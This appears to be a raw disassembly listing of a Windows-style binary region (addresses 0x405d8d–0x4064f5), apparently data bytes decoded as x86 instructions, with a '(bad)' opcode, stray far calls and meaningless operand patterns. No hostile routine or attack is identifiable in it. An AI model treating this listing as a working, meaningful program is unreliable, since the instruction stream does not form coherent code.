  405d8d:	or     al,BYTE PTR [eax]
  405d8f:	add    al,0x2
  405d91:	adc    BYTE PTR [edx+0x1],al
  405d94:	ret    0x4700
  405d97:	mov    BYTE PTR [eax+0x2],al
  405d9a:	add    eax,0x1000040
  405d9f:	add    al,0x82
  405da1:	add    al,BYTE PTR [eax]
  405da3:	test   BYTE PTR [eax+0x44604202],al
  405da9:	add    BYTE PTR [eax],al
  405dab:	adc    al,0xa0
  405dad:	inc    eax
  405dae:	and    al,0x23
  405db0:	inc    ecx
  405db1:	pusha  
  405db2:	or     dh,BYTE PTR [ecx]
  405db4:	add    BYTE PTR [edx+0x13002f00],al
  405dba:	pusha  
  405dbb:	dec    eax
  405dbc:	pusha  
  405dbd:	sub    DWORD PTR [eax+0x0],eax
  405dc0:	or     DWORD PTR [eax],eax
  405dc2:	add    al,BYTE PTR [eax+0x4]
  405dc5:	inc    ecx
  405dc6:	inc    edx
  405dc7:	nop
  405dc8:	and    dl,BYTE PTR [ecx]
  405dca:	inc    edx
  405dcb:	add    BYTE PTR [eax+eax*4],dl
  405dce:	inc    edx
  405dcf:	call   0x1000:0x4000a7
  405dd6:	add    BYTE PTR [esp+eax*1],al
  405dd9:	adc    al,dl
  405ddb:	ret    0x1042
  405dde:	add    al,0xe5
  405de0:	inc    eax
  405de1:	or     BYTE PTR [edx],bl
  405de3:	sbb    BYTE PTR ds:0x1800548,ah
  405de9:	add    DWORD PTR [eax],eax
  405deb:	adc    BYTE PTR [ecx],dl
  405ded:	inc    eax
  405dee:	mov    al,ds:0x88304
  405df3:	add    BYTE PTR [eax+0x10004240],0x11
  405dfa:	and    DWORD PTR [eax+eax*1-0x7febffc0],ebx
  405e01:	loopne 0x405e07
  405e03:	add    BYTE PTR [ecx],al
  405e05:	add    al,BYTE PTR [eax]
  405e07:	adc    BYTE PTR [eax+eax*1+0x44],ch
  405e0b:	xor    BYTE PTR [ecx-0x257bfdef],dl
  405e11:	adc    al,BYTE PTR [eax]
  405e13:	cwde   
  405e14:	push   ecx
  405e15:	adc    BYTE PTR [eax-0x7ff7fe00],al
  405e1b:	mov    BYTE PTR [eax],dl
  405e1d:	xor    BYTE PTR [eax+eax*1+0x0],al
  405e21:	inc    eax
  405e22:	add    BYTE PTR [ebx+eiz*8],0x10
  405e26:	add    BYTE PTR [eax],cl
  405e28:	int    0x2
  405e2a:	rol    BYTE PTR [eax],0x20
  405e2d:	mov    al,ds:0x103c422
  405e32:	mov    ds:0x12002000,al
  405e37:	inc    eax
  405e38:	and    BYTE PTR [eax-0x80],al
  405e3b:	add    DWORD PTR [eax+0x11080138],eax
  405e41:	add    BYTE PTR [esi],dl
  405e43:	add    al,0x8
  405e45:	add    DWORD PTR [eax+0x40],eax
  405e48:	add    al,BYTE PTR [eax]
  405e4a:	inc    eax
  405e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e4c:	add    edx,eax
  405e4e:	sbb    BYTE PTR [esp+eax*1-0x36],cl
  405e52:	inc    edx
  405e53:	and    al,0x1
  405e55:	and    DWORD PTR [ebx],eax
  405e57:	add    DWORD PTR fs:[eax],0xffffffc2
  405e5b:	push   cs
  405e5c:	add    BYTE PTR [eax+0x20],al
  405e5f:	sub    BYTE PTR [edx+eax*1],al
  405e62:	and    BYTE PTR [ecx],dh
  405e64:	add    ch,BYTE PTR [ebp+0x0]
  405e67:	and    BYTE PTR [edx],al
  405e69:	or     DWORD PTR [eax+0x40c3],ecx
  405e6f:	add    BYTE PTR [eax],al
  405e71:	inc    eax
  405e72:	stos   BYTE PTR es:[edi],al
  405e73:	rol    BYTE PTR [eax],0x0
  405e76:	add    al,0x40
  405e78:	and    BYTE PTR [eax+0x4],al
  405e7b:	add    BYTE PTR [ecx-0x12],dl
  405e7e:	ret    0x2000
  405e81:	cmp    BYTE PTR [eax],al
  405e83:	ret    0x140
  405e86:	inc    eax
  405e87:	push   eax
  405e88:	xor    BYTE PTR [ecx],al
  405e8a:	add    BYTE PTR [eax],al
  405e8c:	sbb    BYTE PTR [eax-0x79],al
  405e8f:	sub    BYTE PTR [eax],0x0
  405e92:	mov    BYTE PTR [eax],ch
  405e94:	lds    ecx,FWORD PTR [eax]
  405e96:	or     DWORD PTR [eax],ecx
  405e98:	inc    esi
  405e99:	add    BYTE PTR [esi],0xd0
  405e9c:	test   BYTE PTR [esi],al
  405e9e:	add    DWORD PTR [eax],0x10c128e2
  405ea4:	inc    edx
  405ea5:	add    BYTE PTR [eax+0x0],al
  405ea8:	add    dl,BYTE PTR [ebp+0x2100000]
  405eae:	add    BYTE PTR [edx],al
  405eb0:	add    DWORD PTR [eax],eax
  405eb2:	inc    esp
  405eb3:	push   eax
  405eb4:	add    BYTE PTR [edx+eax*4],al
  405eb7:	add    BYTE PTR [eax],al
  405eb9:	add    al,0x10
  405ebb:	and    bl,al
  405ebd:	add    BYTE PTR [edx],ah
  405ebf:	and    DWORD PTR [eax+0x1a00],eax
  405ec5:	inc    eax
  405ec6:	adc    ebp,DWORD PTR [eax+0x66]
  405ec9:	inc    edx
  405eca:	sub    BYTE PTR [eax+eax*4],cl
  405ecd:	ss inc eax
  405ecf:	sub    al,BYTE PTR [eax]
  405ed1:	adc    BYTE PTR [eax],al
  405ed3:	sbb    BYTE PTR [eax+0x10],al
  405ed6:	add    BYTE PTR [eax+0xa],dl
  405ed9:	sbb    dl,BYTE PTR [ecx+0x20080]
  405edf:	add    BYTE PTR [esi],al
  405ee1:	add    BYTE PTR [edx],bl
  405ee3:	or     BYTE PTR [ecx],al
  405ee5:	inc    edx
  405ee6:	dec    ecx
  405ee7:	inc    eax
  405ee8:	or     al,BYTE PTR [edx]
  405eea:	sbb    DWORD PTR [eax-0x54bbffdc],0x8021c9f2
  405ef4:	add    BYTE PTR [eax],al
  405ef6:	mov    al,0x90
  405ef8:	inc    eax
  405ef9:	daa    
  405efa:	adc    esp,DWORD PTR [eax]
  405efc:	and    BYTE PTR [ecx+0x1],dl
  405eff:	add    DWORD PTR [edx+0x3],eax
  405f02:	add    eax,0x4004a40
  405f07:	add    BYTE PTR [eax],dl
  405f09:	add    DWORD PTR [eax],esp
  405f0b:	sbb    DWORD PTR [eax+0x20c4f7a1],esi
  405f11:	add    BYTE PTR [esi],al
  405f13:	and    eax,DWORD PTR [eax]
  405f15:	add    BYTE PTR [eax+0x200045],0xa0
  405f1c:	test   BYTE PTR [ecx],al
  405f1e:	add    BYTE PTR [eax+eax*1+0x0],al
  405f22:	add    BYTE PTR [eax+0x0],al
  405f25:	inc    edx
  405f26:	adc    BYTE PTR [eax],al
  405f28:	xor    DWORD PTR [eax],eax
  405f2a:	add    al,0xa4
  405f2c:	add    BYTE PTR [eax],dl
  405f2e:	add    al,ch
  405f30:	and    BYTE PTR cs:[eax],al
  405f33:	add    dl,BYTE PTR [ebp+0x23000028]
  405f39:	add    BYTE PTR [edi],cl
  405f3b:	add    al,BYTE PTR [eax]
  405f3d:	sub    al,0x14
  405f3f:	ja     0x405f65
  405f41:	or     DWORD PTR [ecx-0x7ebffa80],eax
  405f47:	dec    edx
  405f48:	mov    ch,BYTE PTR [eax]
  405f4a:	xchg   esp,eax
  405f4b:	adc    BYTE PTR [eax],ah
  405f4d:	add    al,0x2
  405f4f:	and    al,0x46
  405f51:	nop
  405f52:	adc    BYTE PTR [eax],cl
  405f54:	pusha  
  405f55:	add    BYTE PTR [edx],bh
  405f57:	xchg   ebx,eax
  405f58:	adc    BYTE PTR [ebx-0x7fcfc000],ah
  405f5e:	add    BYTE PTR [esi],al
  405f60:	adc    DWORD PTR [eax],esp
  405f62:	sbb    BYTE PTR [eax+0x18],cl
  405f65:	or     DWORD PTR [edx],edx
  405f67:	adc    DWORD PTR [eax],eax
  405f69:	add    eax,DWORD PTR [eax]
  405f6b:	add    BYTE PTR [eax],al
  405f6d:	adc    al,0x0
  405f6f:	pop    ss
  405f70:	push   es
  405f71:	adc    cl,BYTE PTR [edx+0x162020]
  405f77:	and    BYTE PTR [esi+0x31284400],al
  405f7d:	add    al,0xe
  405f7f:	out    dx,al
  405f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f81:	adc    BYTE PTR [edx+0x50],cl
  405f84:	or     DWORD PTR [eax],ecx
  405f86:	add    BYTE PTR [edx],cl
  405f88:	xchg   esp,eax
  405f89:	dec    eax
  405f8a:	or     BYTE PTR [eax+0x50],al
  405f8d:	inc    edx
  405f8e:	inc    eax
  405f8f:	add    eax,DWORD PTR [eax+0x51000090]
  405f95:	inc    eax
  405f96:	mov    BYTE PTR [eax],al
  405f98:	dec    eax
  405f99:	or     BYTE PTR [eax],al
  405f9b:	or     DWORD PTR [eax],esp
  405f9d:	and    DWORD PTR [edx],ecx
  405f9f:	add    BYTE PTR [edx],0x30
  405fa2:	add    DWORD PTR [edx],eax
  405fa4:	or     BYTE PTR [eax+0x0],al
  405fa7:	dec    ecx
  405fa8:	sub    al,BYTE PTR [eax+eax*8]
  405fab:	push   ss
  405fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fad:	adc    BYTE PTR [eax+0x0],dl
  405fb0:	and    cl,BYTE PTR [ecx]
  405fb2:	and    al,0xa
  405fb4:	add    al,BYTE PTR [eax+0x0]
  405fb7:	add    al,0x30
  405fb9:	sub    al,BYTE PTR [eax+0x4120022]
  405fbf:	xor    eax,esp
  405fc1:	add    al,BYTE PTR [eax]
  405fc3:	test   BYTE PTR [eax+0x5],dh
  405fc6:	add    al,dl
  405fc8:	add    al,BYTE PTR [eax-0x3e]
  405fcb:	pop    eax
  405fcc:	dec    edx
  405fcd:	inc    esp
  405fce:	add    eax,0x2a820208
  405fd3:	add    BYTE PTR [ebx],al
  405fd5:	xor    dl,al
  405fd7:	nop
  405fd8:	rcl    DWORD PTR [eax+0x41904900],cl
  405fde:	and    al,0x8
  405fe0:	and    esp,DWORD PTR [eax+0x149]
  405fe6:	ret    0x0
  405fe9:	sub    BYTE PTR [eax+eax*1],cl
  405fec:	dec    esp
  405fed:	add    BYTE PTR [edx],al
  405fef:	add    BYTE PTR [eax],dl
  405ff1:	adc    BYTE PTR [esi],cl
  405ff3:	nop
  405ff4:	mov    eax,0xb0008104
  405ff9:	add    BYTE PTR [eax+0x2],0x1
  405ffd:	or     BYTE PTR [edx+edx*1],al
  406000:	add    DWORD PTR [ecx],eax
  406002:	pusha  
  406003:	add    BYTE PTR [edx],bl
  406005:	add    BYTE PTR [eax+0x4],al
  406008:	popa   
  406009:	sub    DWORD PTR [eax-0x5f],edx
  40600c:	add    al,0x0
  40600e:	les    eax,FWORD PTR [eax+0x22]
  406011:	add    BYTE PTR [eax],al
  406013:	xchg   ecx,eax
  406014:	or     DWORD PTR [eax],0x2013b009
  40601a:	add    BYTE PTR [eax+0x1],al
  40601d:	rol    BYTE PTR [eax],0xc8
  406020:	inc    ecx
  406021:	xor    BYTE PTR [edx],0x40
  406024:	add    BYTE PTR [eax+0x899],0x10
  40602b:	and    BYTE PTR [eax+eax*1],al
  40602e:	add    DWORD PTR [ebx],ecx
  406030:	and    al,ah
  406032:	inc    eax
  406033:	dec    eax
  406034:	add    BYTE PTR [eax],al
  406036:	push   es
  406037:	and    BYTE PTR [eax-0x7fbceddf],0x2
  40603e:	add    BYTE PTR [eax+0x0],al
  406041:	and    DWORD PTR [ebx+0x10008],eax
  406047:	mov    al,0x41
  406049:	add    BYTE PTR [eax+0x40010090],al
  40604f:	and    BYTE PTR [eax],0x20
  406052:	inc    eax
  406053:	pop    es
  406054:	add    al,0x2
  406056:	add    BYTE PTR [eax],al
  406058:	sub    BYTE PTR [eax],bl
  40605a:	inc    eax
  40605b:	add    BYTE PTR [eax+0x142109],ch
  406061:	add    dl,dh
  406063:	or     BYTE PTR [eax+0x20004280],al
  406069:	add    BYTE PTR [eax],al
  40606b:	add    BYTE PTR [eax+0x61],al
  40606e:	add    BYTE PTR [esi],al
  406070:	and    BYTE PTR [eax],al
  406072:	add    al,0x0
  406074:	mov    BYTE PTR [ebp-0x57bffffc],bh
  40607a:	jo     0x40608c
  40607c:	add    DWORD PTR [edx+0x40002a20],edx
  406082:	and    al,BYTE PTR [eax+0x22040]
  406088:	push   eax
  406089:	pop    es
  40608a:	add    BYTE PTR [eax],cl
  40608c:	enter  0x10e8,0x40
  406090:	ret    0x9c8
  406093:	adc    BYTE PTR [eax+0x18],0x80
  406097:	add    BYTE PTR [eax+eax*1],al
  40609a:	mov    al,ds:0x48000018
  40609f:	add    cl,bl
  4060a1:	add    DWORD PTR [edx],edx
  4060a3:	inc    eax
  4060a4:	add    al,BYTE PTR [eax]
  4060a6:	inc    eax
  4060a7:	add    BYTE PTR [esp+edx*4+0x2a0008],al
  4060ae:	add    DWORD PTR [eax],eax
  4060b0:	adc    BYTE PTR [eax],cl
  4060b2:	add    al,BYTE PTR [eax+0x65008248]
  4060b8:	and    BYTE PTR [esi+ecx*2],dl
  4060bb:	add    cl,BYTE PTR ds:0x42134012
  4060c1:	add    BYTE PTR [esi+0x8],0x8c
  4060c5:	and    cl,BYTE PTR [eax]
  4060c7:	adc    BYTE PTR [eax],al
  4060c9:	adc    al,0x75
  4060cb:	add    BYTE PTR [edx+0x42048000],bl
  4060d1:	inc    edx
  4060d2:	add    BYTE PTR [eax],0x8
  4060d5:	or     BYTE PTR [ecx+0x40700026],al
  4060db:	add    BYTE PTR [eax],al
  4060dd:	and    BYTE PTR [esi],ah
  4060df:	adc    BYTE PTR [ecx],al
  4060e1:	and    BYTE PTR ds:0x180004,0x2
  4060e8:	adc    BYTE PTR [eax+0x34],al
  4060eb:	adc    ch,BYTE PTR [edx+0x2]
  4060ee:	add    BYTE PTR [eax],al
  4060f0:	add    ecx,DWORD PTR [eax+0x448804]
  4060f6:	mov    eax,ds:0x12012200
  4060fb:	or     al,BYTE PTR [ecx]
  4060fd:	and    BYTE PTR [eax+eax*8],ah
  406100:	add    BYTE PTR [edx+0x184000],0x5
  406107:	arpl   WORD PTR [eax+0x8],dx
  40610a:	push   es
  40610b:	adc    BYTE PTR [eax],al
  40610d:	add    BYTE PTR [eax+eax*1],ah
  406110:	es or  al,0x0
  406113:	adc    cl,BYTE PTR [edx+edx*1]
  406116:	adc    ah,BYTE PTR [edx+0x0]
  406119:	add    DWORD PTR [eax+0x30],eax
  40611c:	add    BYTE PTR [eax],0x20
  40611f:	add    DWORD PTR [eax],0x2c004c
  406125:	push   0x105827c8
  40612a:	inc    eax
  40612b:	shr    BYTE PTR [eax],0x82
  40612e:	and    bl,BYTE PTR [eax+0x4]
  406131:	or     BYTE PTR [edx],ah
  406133:	add    al,BYTE PTR ds:0x8444
  406139:	add    ecx,DWORD PTR ds:0x4008
  40613f:	or     DWORD PTR [eax+esi*2],esp
  406142:	ret    
  406143:	add    BYTE PTR [edx+0x25],al
  406146:	add    BYTE PTR [eax+0x42],ch
  406149:	rcl    BYTE PTR [ecx],0x0
  40614c:	adc    BYTE PTR [edx-0x7bdfddfe],al
  406152:	popa   
  406153:	and    BYTE PTR [ecx+0xa5],ch
  406159:	and    ah,BYTE PTR [eax]
  40615b:	add    eax,0x88100800
  406160:	add    BYTE PTR [eax],bl
  406162:	add    DWORD PTR [eax],eax
  406164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406165:	add    BYTE PTR [ecx],cl
  406167:	or     DWORD PTR [eax],0x33002004
  40616d:	add    BYTE PTR [ecx],ah
  40616f:	add    DWORD PTR [ecx],esi
  406171:	inc    ecx
  406172:	add    BYTE PTR [ecx+eax*1],ah
  406175:	test   BYTE PTR [eax+0x260c0049],al
  40617b:	and    BYTE PTR [ecx],ah
  40617d:	inc    eax
  40617e:	ret    
  40617f:	add    BYTE PTR [eax],dl
  406181:	add    BYTE PTR [ecx+0x0],cl
  406184:	and    DWORD PTR [edx+0x71800],eax
  40618a:	adc    BYTE PTR [eax+0x44090608],bl
  406190:	or     BYTE PTR [eax],0x1e
  406193:	add    DWORD PTR [eax+0x4],eax
  406196:	inc    esp
  406197:	add    BYTE PTR [eax+0x9],al
  40619a:	and    BYTE PTR [ecx],al
  40619c:	shl    BYTE PTR [esi],0x46
  40619f:	add    dl,bh
  4061a1:	add    al,BYTE PTR [eax]
  4061a3:	inc    ecx
  4061a4:	add    al,BYTE PTR [edx]
  4061a6:	dec    esp
  4061a7:	or     DWORD PTR [eax+eax*1+0x40809903],eax
  4061ae:	jo     0x406150
  4061b0:	add    BYTE PTR [edi],cl
  4061b2:	add    BYTE PTR [eax],al
  4061b4:	dec    edx
  4061b5:	add    BYTE PTR [eax+0x1],al
  4061b8:	mov    es,WORD PTR [eax+0xc]
  4061bb:	jne    0x4061c5
  4061bd:	outs   dx,DWORD PTR ds:[esi]
  4061be:	and    BYTE PTR [eax+esi*1+0x60740000],ah
  4061c5:	mov    al,0x84
  4061c7:	and    BYTE PTR [ecx+0x32c020a],al
  4061cd:	call   0xc0e1e2
  4061d2:	and    al,0x8
  4061d4:	add    bl,BYTE PTR [eax]
  4061d6:	inc    eax
  4061d7:	add    BYTE PTR [eax],cl
  4061d9:	inc    eax
  4061da:	add    BYTE PTR [ecx-0x7dfffefb],cl
  4061e0:	and    ah,BYTE PTR [ecx]
  4061e2:	pusha  
  4061e3:	lods   eax,DWORD PTR ds:[esi]
  4061e4:	rol    cl,0x60
  4061e7:	add    al,0x9
  4061e9:	and    al,0x0
  4061eb:	or     BYTE PTR [eax+0x10],al
  4061ee:	add    al,0x40
  4061f0:	push   0x507002
  4061f5:	pusha  
  4061f6:	add    BYTE PTR [ebx+0xa600],ch
  4061fc:	(bad)  
  4061fd:	fbld   TBYTE PTR [eax+edx*1]
  406200:	add    BYTE PTR [edx],cl
  406202:	add    BYTE PTR [ecx+0x0],al
  406205:	inc    ecx
  406206:	enter  0x6300,0x0
  40620a:	adc    BYTE PTR [edx],ah
  40620c:	add    ebp,DWORD PTR [edx]
  40620e:	add    BYTE PTR [eax],al
  406210:	add    DWORD PTR [eax-0x7fbfff14],0x1204042
  40621a:	add    al,0xb
  40621c:	adc    BYTE PTR [ebx-0x80],ah
  40621f:	or     DWORD PTR [edx],ecx
  406221:	push   ecx
  406222:	or     BYTE PTR [eax],al
  406224:	add    BYTE PTR [ecx],bl
  406226:	inc    ebx
  406227:	add    BYTE PTR [eax],cl
  406229:	pop    es
  40622a:	mov    eax,0x1500a92
  40622f:	add    eax,0xb2c4
  406234:	inc    esp
  406235:	add    BYTE PTR [eax+eiz*2],cl
  406238:	add    BYTE PTR [eax-0x1ffffd80],al
  40623e:	sbb    BYTE PTR [eax+eax*1],al
  406241:	inc    esp
  406242:	add    BYTE PTR [edx+ebp*1+0x52],al
  406246:	sub    al,0x90
  406248:	mov    al,ds:0x8c026012
  40624d:	or     eax,0x44b3504f
  406252:	add    BYTE PTR [edx],al
  406254:	push   ebp
  406255:	push   0xffffffa6
  406257:	add    BYTE PTR [eax],al
  406259:	add    BYTE PTR [eax],al
  40625b:	add    al,0x0
  40625d:	adc    eax,0x400d600
  406262:	add    cl,BYTE PTR [eax+0x0]
  406265:	add    cl,BYTE PTR [eax]
  406267:	sbb    DWORD PTR [ecx+0x10],esi
  40626a:	sub    DWORD PTR [eax],0x480800c0
  406270:	add    BYTE PTR [eax],cl
  406272:	or     BYTE PTR [esi],cl
  406274:	mov    al,ds:0x4044809
  406279:	add    ah,BYTE PTR [eax+0x30]
  40627c:	or     BYTE PTR [ecx-0x7fff57c8],dl
  406282:	jo     0x406285
  406284:	xchg   esi,eax
  406285:	add    BYTE PTR [edx],al
  406287:	or     eax,0xc90a0005
  40628c:	add    BYTE PTR [eax],al
  40628e:	add    al,BYTE PTR [eax]
  406290:	adc    eax,0x40480025
  406295:	add    eax,DWORD PTR [ecx]
  406297:	inc    eax
  406298:	and    BYTE PTR [eax],0x80
  40629b:	stos   BYTE PTR es:[edi],al
  40629c:	add    BYTE PTR [eax+ebp*1],al
  40629f:	pop    es
  4062a0:	je     0x4062a2
  4062a2:	loopne 0x4062a4
  4062a4:	add    BYTE PTR [edi+0xc8000],0x9c
  4062ab:	or     BYTE PTR [edx+eax*4+0x40],al
  4062af:	add    DWORD PTR [ecx+0x14],eax
  4062b2:	nop
  4062b3:	add    BYTE PTR [eax],ah
  4062b5:	inc    eax
  4062b6:	add    BYTE PTR [eax+0x58],al
  4062b9:	sub    dl,BYTE PTR [eax]
  4062bb:	add    BYTE PTR [edx+0xa0019],0x4
  4062c2:	add    BYTE PTR [eax+eax*2+0x0],al
  4062c6:	add    BYTE PTR [eax],dl
  4062c8:	add    al,BYTE PTR [eax+0x0]
  4062cb:	and    BYTE PTR [eax],al
  4062cd:	inc    eax
  4062ce:	add    BYTE PTR [eax-0x28],0x9
  4062d2:	dec    eax
  4062d3:	dec    eax
  4062d4:	sbb    BYTE PTR [eax],al
  4062d6:	add    BYTE PTR [eax+0x90252],ah
  4062dc:	add    BYTE PTR [eax],al
  4062de:	add    BYTE PTR [ecx],al
  4062e0:	add    BYTE PTR [ecx],al
  4062e2:	or     BYTE PTR [eax],al
  4062e4:	dec    edx
  4062e5:	add    BYTE PTR [eax-0x60],ah
  4062e8:	pop    eax
  4062e9:	sbb    BYTE PTR [edx],al
  4062eb:	inc    ebx
  4062ec:	or     BYTE PTR [eax],ah
  4062ee:	add    eax,DWORD PTR [ebx+0xa]
  4062f1:	int3   
  4062f2:	nop
  4062f3:	rol    BYTE PTR [eax],0x8
  4062f6:	or     al,BYTE PTR [eax]
  4062f8:	inc    ebx
  4062f9:	add    DWORD PTR [eax],eax
  4062fb:	and    DWORD PTR [edx],eax
  4062fd:	inc    eax
  4062fe:	add    BYTE PTR [edx],al
  406300:	add    BYTE PTR [eax],al
  406302:	add    BYTE PTR [ecx],al
  406304:	add    DWORD PTR [eax],eax
  406306:	adc    BYTE PTR [eax],al
  406308:	or     BYTE PTR [ecx],dh
  40630a:	add    al,BYTE PTR [edx+ebp*4]
  40630d:	or     al,BYTE PTR [edx+0x18]
  406310:	or     BYTE PTR [eax],al
  406312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406313:	sbb    al,0x1
  406315:	add    DWORD PTR [edx+0x41000056],eax
  40631b:	add    eax,DWORD PTR [edx]
  40631d:	or     DWORD PTR [eax+eax*1+0x45],eax
  406321:	or     al,bh
  406323:	mov    fs,WORD PTR [ecx+0x11]
  406326:	inc    eax
  406327:	fs and al,0x2
  40632a:	add    BYTE PTR [eax+0x2029264c],cl
  406330:	inc    eax
  406331:	xchg   esp,eax
  406332:	add    BYTE PTR [edx],al
  406334:	add    BYTE PTR [edx+ecx*1],al
  406337:	inc    ebp
  406338:	add    DWORD PTR [edx],esp
  40633a:	pusha  
  40633b:	and    BYTE PTR [eax-0x80],al
  40633e:	xchg   ebp,eax
  40633f:	add    al,0xe
  406341:	sub    eax,0xc300a080
  406346:	or     BYTE PTR [eax],ah
  406348:	add    BYTE PTR [eax+0x802],al
  40634e:	add    cl,BYTE PTR [eax]
  406350:	add    cl,BYTE PTR [edx+0x22]
  406353:	or     al,0x2
  406355:	add    BYTE PTR [eax],al
  406357:	adc    eax,DWORD PTR [eax]
  406359:	inc    ecx
  40635a:	inc    eax
  40635b:	adc    BYTE PTR [eax+0x0],dl
  40635e:	add    cl,BYTE PTR [ecx]
  406360:	and    cl,BYTE PTR [eax]
  406362:	inc    eax
  406363:	and    DWORD PTR [eax-0x3a],esp
  406366:	add    BYTE PTR [eax+0x68000000],0x11
  40636d:	add    BYTE PTR [eax-0x79bfbdfe],al
  406373:	adc    al,0x0
  406375:	inc    ecx
  406376:	adc    BYTE PTR [eax+0x10],al
  406379:	or     al,BYTE PTR [edx+eax*1+0x20]
  40637d:	and    al,0x40
  40637f:	push   eax
  406380:	test   BYTE PTR [eax],al
  406382:	and    DWORD PTR [eax],eax
  406384:	add    al,0x5
  406386:	inc    esp
  406387:	or     BYTE PTR [eax],dl
  406389:	add    dl,al
  40638b:	and    BYTE PTR [eax],al
  40638d:	add    BYTE PTR es:[edx],al
  406390:	add    BYTE PTR [ecx-0x7eff3b5e],ah
  406396:	add    BYTE PTR [eax],cl
  406398:	push   ss
  406399:	add    BYTE PTR [eax+0x40],al
  40639c:	add    BYTE PTR [ecx-0x7e],al
  40639f:	add    BYTE PTR [esp+edx*2-0x7efeffe8],bl
  4063a6:	add    BYTE PTR [eax+eax*1],ch
  4063a9:	adc    BYTE PTR [ecx-0x7fd7f7e0],al
  4063af:	add    ch,BYTE PTR [ecx+0x88400]
  4063b5:	inc    esp
  4063b6:	inc    eax
  4063b7:	and    al,0x24
  4063b9:	inc    eax
  4063ba:	adc    ah,BYTE PTR [esi]
  4063bc:	or     BYTE PTR [ecx],al
  4063be:	inc    ecx
  4063bf:	inc    eax
  4063c0:	or     al,BYTE PTR [ecx+0x8ca0002]
  4063c6:	adc    BYTE PTR [edx+0x0],0x0
  4063ca:	add    al,0x11
  4063cc:	add    DWORD PTR [eax],edx
  4063ce:	add    BYTE PTR [eax-0x7e],al
  4063d1:	test   BYTE PTR [eax+eax*2],ch
  4063d4:	and    BYTE PTR [eax+0xa],al
  4063d7:	add    al,0x0
  4063d9:	sub    al,0x42
  4063db:	pop    eax
  4063dc:	add    dl,BYTE PTR fs:[eax]
  4063df:	add    BYTE PTR [eax],al
  4063e1:	and    eax,0x5100c612
  4063e6:	or     al,0x0
  4063e8:	or     BYTE PTR [eax+0x21],al
  4063eb:	add    DWORD PTR [eax+eiz*2],eax
  4063ee:	add    DWORD PTR [ecx+0x20070805],eax
  4063f4:	add    BYTE PTR [eax+0x0],ah
  4063f7:	inc    eax
  4063f8:	add    BYTE PTR [esi],ah
  4063fa:	push   es
  4063fb:	add    BYTE PTR [ecx],al
  4063fd:	dec    edx
  4063fe:	push   eax
  4063ff:	add    BYTE PTR [eax+0x30],al
  406402:	mov    eax,ds:0x50f1ca44
  406407:	add    cl,BYTE PTR [eax]
  406409:	add    al,0xc5
  40640b:	or     BYTE PTR [ecx],dl
  40640d:	or     BYTE PTR [eax],0x58
  406410:	add    BYTE PTR [ecx],al
  406412:	inc    eax
  406413:	and    BYTE PTR [edx],0x0
  406416:	push   eax
  406417:	adc    al,0x50
  406419:	add    BYTE PTR [eax],ah
  40641b:	and    BYTE PTR [eax-0x2fff7fde],dl
  406421:	xchg   esp,eax
  406422:	add    ah,BYTE PTR [ecx]
  406424:	push   edi
  406425:	mov    dl,0x50
  406427:	loopne 0x40642a
  406429:	adc    DWORD PTR [ecx+0x40],eax
  40642c:	inc    eax
  40642d:	bound  eax,QWORD PTR [eax+0x18a04001]
  406433:	or     eax,DWORD PTR [ecx]
  406435:	rcr    DWORD PTR [eax-0x6b4ecd38],0x24
  40643c:	inc    eax
  40643d:	mov    al,ds:0x3001458
  406442:	add    BYTE PTR [eax+ecx*4],cl
  406445:	adc    edx,eax
  406447:	add    BYTE PTR [eax+0x10616612],al
  40644d:	adc    DWORD PTR [eax],eax
  40644f:	and    DWORD PTR [eax],edx
  406451:	inc    eax
  406452:	inc    ecx
  406453:	mov    ebx,0x408104
  406458:	mov    BYTE PTR [eax],al
  40645a:	inc    eax
  40645b:	test   DWORD PTR [eax],eax
  40645d:	test   BYTE PTR [ecx-0x7d],al
  406460:	add    DWORD PTR [ecx],edx
  406462:	add    BYTE PTR [eax],al
  406464:	inc    eax
  406465:	sbb    BYTE PTR [eax+edx*1+0x100020a4],0x8
  40646d:	inc    ecx
  40646e:	add    BYTE PTR [ebp+0x84020],0xd0
  406475:	and    esi,esi
  406477:	mov    cl,0x2c
  406479:	adc    BYTE PTR [edx+0x40],0x5c
  40647d:	add    DWORD PTR [eax],esp
  40647f:	dec    esi
  406480:	xor    BYTE PTR [eax+0x0],dh
  406483:	add    BYTE PTR [eax],al
  406485:	add    BYTE PTR [edx],al
  406487:	add    BYTE PTR [eax],al
  406489:	add    BYTE PTR [eax],al
  40648b:	sbb    ebx,edx
  40648d:	inc    esi
  40648e:	add    BYTE PTR [eax],al
  406490:	add    al,BYTE PTR [edx]
  406492:	add    al,BYTE PTR [eax]
  406494:	xchg   ebp,eax
  406495:	aam    0x4c
  406497:	add    BYTE PTR [ecx+0x0],al
  40649a:	or     BYTE PTR [eax+0x427218],al
  4064a0:	add    DWORD PTR [ecx+eax*1-0x77ff3fff],esi
  4064a7:	fadd   DWORD PTR [eax]
  4064a9:	push   es
  4064aa:	or     DWORD PTR [eax],eax
  4064ac:	add    BYTE PTR [eax],ah
  4064ae:	inc    eax
  4064af:	sbb    BYTE PTR [eax],0x0
  4064b2:	inc    ebp
  4064b3:	adc    al,BYTE PTR [eax]
  4064b5:	sbb    BYTE PTR [ecx],al
  4064b7:	add    BYTE PTR [ecx+0x30],al
  4064ba:	add    BYTE PTR [eax],al
  4064bc:	inc    eax
  4064bd:	add    BYTE PTR [eax+0x10],cl
  4064c0:	inc    eax
  4064c1:	or     al,cl
  4064c3:	rol    BYTE PTR [eax],0xaa
  4064c6:	dec    eax
  4064c7:	and    al,0x0
  4064c9:	add    eax,0x8ca8e00
  4064ce:	sbb    eax,0xc2000502
  4064d3:	add    dl,dl
  4064d5:	adc    al,al
  4064d7:	or     bl,BYTE PTR [esi]
  4064d9:	inc    eax
  4064da:	or     DWORD PTR [edx],0x10
  4064dd:	nop
  4064de:	and    eax,DWORD PTR [eax+0x2870211]
  4064e4:	add    DWORD PTR [eax],ecx
  4064e6:	and    BYTE PTR [esi],ah
  4064e8:	push   eax
  4064e9:	les    edx,FWORD PTR [eax]
  4064eb:	or     BYTE PTR [edx],al
  4064ed:	rcl    BYTE PTR [ecx],1
  4064ef:	mov    eax,DWORD PTR [ebx-0x80]
  4064f2:	add    DWORD PTR [ecx+eiz*1],eax
  4064f5:	add    BYTE PTR [ecx],al
